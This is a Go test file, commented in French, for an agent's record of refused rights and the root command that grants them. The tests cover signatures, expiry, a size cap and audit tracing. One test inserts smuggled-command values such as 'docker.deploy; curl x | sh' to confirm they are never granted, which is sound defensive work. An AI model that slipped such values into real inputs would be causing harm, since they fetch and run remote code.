package agent

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/ldesfontaine/kagu/internal/fact/agentpolicy"
	"github.com/ldesfontaine/kagu/internal/wire/agentwire"
)

// pendingBench est un agent passé à la politique, observe seul, sur un faux
// système : root y lit la liste et y pose les droits.
func pendingBench(t *testing.T) *migratedBench {
	t.Helper()
	b := migrate(t, newOrderBench(t))
	b.opts.System = newRecordingSystem()
	return b
}

// refuseDeploy envoie un ordre docker.deploy signé par signer, de rang seq.
func (b *migratedBench) refuseDeploy(t *testing.T, seq int64, signer ed25519.PrivateKey) agentwire.ActionResult {
	t.Helper()
	body := order(seq)
	body.Kind = agentwire.KindDockerDeploy
	body.NotAfter = b.clock.now.Add(time.Minute).Unix()
	return b.send(t, body, signer)
}

// pendingNames lit la liste comme root et rend les droits à poser.
func (b *migratedBench) pendingNames(t *testing.T) []string {
	t.Helper()
	return grantablePendingRights(t, b.opts)
}

// grantablePendingRights lit la liste comme « grant --pending » en root et
// rend les droits qu'il poserait.
func grantablePendingRights(t *testing.T, opts PolicyOptions) []string {
	t.Helper()
	pending, err := ReadPendingRightsAsRoot(opts)
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, entry := range pending.Grantable {
		names = append(names, entry.Text())
	}
	return names
}

// R-A3-15 (E03-07) : un droit que l'agent refuse à un ordre jugé entre dans
// sa liste, écrite en 0600 dans son état.
func TestR_A3_15_E03_07_ARefusedRightIsNotedByTheAgent(t *testing.T) {
	b := pendingBench(t)
	if result := b.refuseDeploy(t, 1, b.private); result.Reason != agentwire.RightMissing(agentpolicy.CapabilityDockerDeploy) {
		t.Fatalf("deploy %+v", result)
	}
	if names := b.pendingNames(t); !slices.Equal(names, []string{"docker.deploy"}) {
		t.Fatalf("pending %v, want docker.deploy", names)
	}
	info, err := b.stateDir.Stat(pendingRightsFile)
	if err != nil || info.Mode().Perm() != pendingRightsMode {
		t.Fatalf("pending file %v %v", info, err)
	}
	// Un second refus garde une entrée, à l'heure du dernier.
	b.clock.advance(time.Hour)
	b.refuseDeploy(t, 2, b.private)
	entries, err := readPendingRights(b.stateDir)
	if err != nil || len(entries) != 1 || !entries[0].RefusedAt.Equal(b.clock.now) {
		t.Fatalf("entries %+v %v", entries, err)
	}
}

// Rien de ce que le serveur dit sans signature valable n'écrit dans la liste :
// un ordre mal signé, pour un autre agent, rejoué ou périmé est refusé avant
// le jugement du droit. Un ordre qui passe n'y écrit rien non plus.
func TestR_A3_15_E03_07_OnlyAJudgedRefusalIsNoted(t *testing.T) {
	b := pendingBench(t)
	_, stranger, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	if result := b.refuseDeploy(t, 1, stranger); result.Reason != agentwire.ReasonBadSignature {
		t.Fatalf("forged %+v", result)
	}
	otherAgent := order(2)
	otherAgent.Kind, otherAgent.AgentID = agentwire.KindDockerDeploy, "agt_other"
	if result := b.send(t, otherAgent, b.private); result.Reason != agentwire.ReasonWrongAgent {
		t.Fatalf("other agent %+v", result)
	}
	expired := order(3)
	expired.Kind, expired.NotAfter = agentwire.KindDockerDeploy, b.clock.now.Add(-time.Second).Unix()
	if result := b.send(t, expired, b.private); result.Reason != agentwire.ReasonExpired {
		t.Fatalf("expired %+v", result)
	}
	if result := b.pingAt(t, 4, b.private); result.State != agentwire.ActionSucceeded {
		t.Fatalf("ping %+v", result)
	}
	if names := b.pendingNames(t); len(names) != 0 {
		t.Fatalf("pending %v, want none", names)
	}
	if _, err := b.stateDir.Stat(pendingRightsFile); err == nil {
		t.Fatal("the pending file was written")
	}
}

// Une entrée vaut 24 h après le dernier refus ; une entrée datée du futur ne
// vaut pas.
func TestR_A3_15_E03_07_AnEntryOlderThan24hIsIgnored(t *testing.T) {
	b := pendingBench(t)
	b.refuseDeploy(t, 1, b.private)
	b.clock.advance(pendingRightLife - time.Second)
	if names := b.pendingNames(t); !slices.Equal(names, []string{"docker.deploy"}) {
		t.Fatalf("pending before 24 h %v", names)
	}
	b.clock.advance(time.Second)
	if names := b.pendingNames(t); len(names) != 0 {
		t.Fatalf("pending after 24 h %v, want none", names)
	}
	future := PendingRight{Name: agentpolicy.CapabilityDockerDeploy, RefusedAt: b.clock.now.Add(time.Hour)}
	if future.live(b.clock.now) {
		t.Fatal("an entry from the future is live")
	}
}

// Au plafond, le plus ancien refus tombe.
func TestR_A3_15_E03_07_TheOldestEntryFallsAtTheCeiling(t *testing.T) {
	b := pendingBench(t)
	for index := range maxPendingRights + 1 {
		entry := PendingRight{Name: fmt.Sprintf("right-%02d", index), RefusedAt: b.clock.now.Add(time.Duration(index-maxPendingRights) * time.Minute)}
		if err := b.runner.updatePendingRights(func(rights []PendingRight) []PendingRight { return append(rights, entry) }); err != nil {
			t.Fatal(err)
		}
	}
	entries, err := readPendingRights(b.stateDir)
	if err != nil || len(entries) != maxPendingRights {
		t.Fatalf("%d entries %v, want %d", len(entries), err, maxPendingRights)
	}
	if entries[0].Name != "right-01" || entries[len(entries)-1].Name != fmt.Sprintf("right-%02d", maxPendingRights) {
		t.Fatalf("kept %s … %s, the oldest must fall", entries[0].Name, entries[len(entries)-1].Name)
	}
}

// grant --pending pose par le chemin de grant, avec sa trace ; le droit posé
// sort de la liste à la relecture de la politique, et n'y entre plus.
func TestR_A3_15_E03_07_GrantPendingGoesThroughGrant(t *testing.T) {
	b := pendingBench(t)
	b.refuseDeploy(t, 1, b.private)
	var trace []string
	b.opts.Audit = func(message string) error {
		trace = append(trace, message)
		return nil
	}
	pending, err := ReadPendingRightsAsRoot(b.opts)
	if err != nil {
		t.Fatal(err)
	}
	change, err := GrantPending(b.opts, pending.Grantable, accept)
	if err != nil || !slices.Equal(change.Added, []string{"docker.deploy"}) {
		t.Fatalf("change %+v %v", change, err)
	}
	if len(trace) != 1 || !strings.HasPrefix(trace[0], "policy grant +[docker.deploy] -[]") {
		t.Fatalf("audit %q", trace)
	}
	b.runner.currentPolicy()
	if entries, err := readPendingRights(b.stateDir); err != nil || len(entries) != 0 {
		t.Fatalf("a granted right stays pending: %+v %v", entries, err)
	}
	b.runner.notePendingRight(judgedOrder{}, agentwire.RightMissing(agentpolicy.CapabilityDockerDeploy))
	if entries, _ := readPendingRights(b.stateDir); len(entries) != 0 {
		t.Fatalf("a held right entered the list: %+v", entries)
	}
}

// Une valeur ne se note que lue hors du serveur : un producteur de la liste
// fermée. Sans elle, root choisit la valeur ; rien ne se pose seul.
func TestR_A3_15_E03_07_OnlyAClosedValueIsNoted(t *testing.T) {
	b := pendingBench(t)
	known := judgedOrder{Order: agentwire.Order{Kind: agentwire.KindBackupProduce, Params: agentwire.BackupProduceParams{Producer: agentpolicy.ProducerProxmoxVzdump}}}
	b.runner.notePendingRight(known, agentwire.RightMissing(agentpolicy.CapabilityBackupProduce))
	if names := b.pendingNames(t); !slices.Equal(names, []string{"backup.produce=proxmox-vzdump"}) {
		t.Fatalf("pending %v", names)
	}
	b.runner.notePendingRight(judgedOrder{}, agentwire.RightMissing(agentpolicy.CapabilityResticTarget))
	pending, err := ReadPendingRightsAsRoot(b.opts)
	if err != nil || len(pending.NeedsValue) != 1 || pending.NeedsValue[0].Name != agentpolicy.CapabilityResticTarget {
		t.Fatalf("needs value %+v %v", pending, err)
	}
	if got := missingValueOf(judgedOrder{Order: agentwire.Order{Params: agentwire.BackupProduceParams{Producer: "rm-rf"}}}, agentpolicy.CapabilityBackupProduce); got != "" {
		t.Fatalf("an unknown producer was noted: %q", got)
	}
}

// Le fichier est écrit par le compte de l'agent : root n'y lit qu'un droit
// connu, d'une valeur bien formée. Ce que l'agent n'a pas refusé ne se pose
// jamais.
func TestR_A3_15_E03_07_AnUnknownOrHostileEntryIsNeverGranted(t *testing.T) {
	b := pendingBench(t)
	now := b.clock.now
	hostile := []PendingRight{
		{Name: "docker.deploy; curl x | sh", RefusedAt: now},
		{Name: agentpolicy.CapabilityFilesWrite, Value: "/srv; curl x | sh", RefusedAt: now},
		{Name: "root", RefusedAt: now},
	}
	if err := b.runner.updatePendingRights(func(rights []PendingRight) []PendingRight { return append(rights, hostile...) }); err != nil {
		t.Fatal(err)
	}
	pending, err := ReadPendingRightsAsRoot(b.opts)
	if err != nil || len(pending.Grantable) != 0 || len(pending.NeedsValue) != 0 {
		t.Fatalf("pending %+v %v, want nothing", pending, err)
	}
	if _, err := ReadPendingRightsAsRoot(PolicyOptions{StateDir: b.opts.StateDir, StatePath: b.opts.StatePath, EUID: 1000}); err == nil {
		t.Fatal("a non-root account read the list")
	}
}

// requestRight envoie un ordre right.request signé, de rang seq.
func (b *migratedBench) requestRight(t *testing.T, seq int64, params agentwire.RightRequestParams) agentwire.ActionResult {
	t.Helper()
	return b.requestRightSignedBy(t, seq, params, b.private)
}

// requestRightSignedBy envoie un ordre right.request signé par signer.
func (b *migratedBench) requestRightSignedBy(t *testing.T, seq int64, params agentwire.RightRequestParams, signer ed25519.PrivateKey) agentwire.ActionResult {
	t.Helper()
	encoded, err := json.Marshal(params)
	if err != nil {
		t.Fatal(err)
	}
	body := order(seq)
	body.Kind, body.Params = agentwire.KindRightRequest, encoded
	body.NotAfter = b.clock.now.Add(time.Minute).Unix()
	return b.send(t, body, signer)
}

// ARB-1 : l'agent n'exécute rien pour right.request. Sans le droit, il le
// refuse right_missing et la liste le porte, valeur comprise ; quand il le
// tient, l'ordre réussit à vide et la liste reste vide.
func TestARB1_TheAgentRefusesAndNotesARequestedRight(t *testing.T) {
	b := pendingBench(t)
	deploy := agentwire.RightRequestParams{Right: agentpolicy.CapabilityDockerDeploy}
	if result := b.requestRight(t, 1, deploy); result.State != agentwire.ActionRefused || result.Reason != "right_missing:docker.deploy" {
		t.Fatalf("without the right: %+v", result)
	}
	vzdump := agentwire.RightRequestParams{Right: agentpolicy.CapabilityBackupProduce, Value: agentpolicy.ProducerProxmoxVzdump}
	b.requestRight(t, 2, vzdump)
	if names := b.pendingNames(t); !slices.Equal(names, []string{"docker.deploy", "backup.produce=proxmox-vzdump"}) {
		t.Fatalf("pending %v", names)
	}

	held := pendingBench(t)
	if _, err := GrantRights(held.opts, []agentpolicy.Capability{{Name: agentpolicy.CapabilityDockerDeploy}}, agentpolicy.Term{}, accept); err != nil {
		t.Fatal(err)
	}
	result := held.requestRight(t, 1, deploy)
	if result.State != agentwire.ActionSucceeded || result.Reason != "" || len(result.Output) != 0 {
		t.Fatalf("with the right: %+v", result)
	}
	if names := held.pendingNames(t); len(names) != 0 {
		t.Fatalf("pending %v, want none", names)
	}
	if _, err := held.stateDir.Stat(pendingRightsFile); err == nil {
		t.Fatal("the pending file was written for a held right")
	}
}

// requestedRights sont les droits que l'interface demande : l'ouvreur de
// chaque groupe de l'onglet Droits, et terminal.host, demandé par l'API.
var requestedRights = []string{
	agentpolicy.CapabilityDockerDeploy,
	agentpolicy.CapabilityResticProduce,
	agentpolicy.CapabilityTerminalContainer,
	agentpolicy.CapabilityNetworkPrivate,
	agentpolicy.CapabilityTerminalHost,
}

// R-A3-15 (ARB-3) : la note et la lecture de root acceptent tout droit que la
// politique connaît (agentpolicy.IsKnown), les droits de la politique seule
// compris. Un right.request signé refusé entre dans la liste, root le lit et
// le pose par le chemin de grant.
func TestR_A3_15_ARB3_EveryRequestedRightIsNotedAndGranted(t *testing.T) {
	for _, right := range requestedRights {
		t.Run(right, func(t *testing.T) {
			b := pendingBench(t)
			result := b.requestRight(t, 1, agentwire.RightRequestParams{Right: right})
			if result.State != agentwire.ActionRefused || result.Reason != agentwire.RightMissing(right) {
				t.Fatalf("request %+v", result)
			}
			if entries, err := readPendingRights(b.stateDir); err != nil || len(entries) != 1 || entries[0].Name != right {
				t.Fatalf("noted %+v %v, want %s", entries, err, right)
			}
			pending, err := ReadPendingRightsAsRoot(b.opts)
			if err != nil || len(pending.Grantable) != 1 || pending.Grantable[0].Name != right {
				t.Fatalf("root reads %+v %v, want %s", pending, err, right)
			}
			change, err := GrantPending(b.opts, pending.Grantable, accept)
			if err != nil || len(change.Added) != 1 || !agentpolicy.HasCapability(change.After.Rights, right) {
				t.Fatalf("grant %+v %v", change, err)
			}
			if expiry, bounded := change.After.Expiries[right]; bounded != (right == agentpolicy.CapabilityTerminalHost) ||
				bounded && expiry.Until.Sub(expiry.Granted.Now) != 2*time.Hour {
				t.Fatalf("term of %s: %+v", right, change.After.Expiries)
			}
		})
	}
}

// Témoin : un right.request signé par une autre clé est refusé avant le
// jugement du droit et ne note rien, droit de la politique seule compris.
func TestR_A3_15_ARB3_AForeignSignatureNotesNothing(t *testing.T) {
	b := pendingBench(t)
	_, stranger, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	for index, right := range requestedRights {
		result := b.requestRightSignedBy(t, int64(index+1), agentwire.RightRequestParams{Right: right}, stranger)
		if result.Reason != agentwire.ReasonBadSignature {
			t.Fatalf("%s forged: %+v", right, result)
		}
	}
	if _, err := b.stateDir.Stat(pendingRightsFile); err == nil {
		t.Fatal("a forged request wrote the pending file")
	}
}
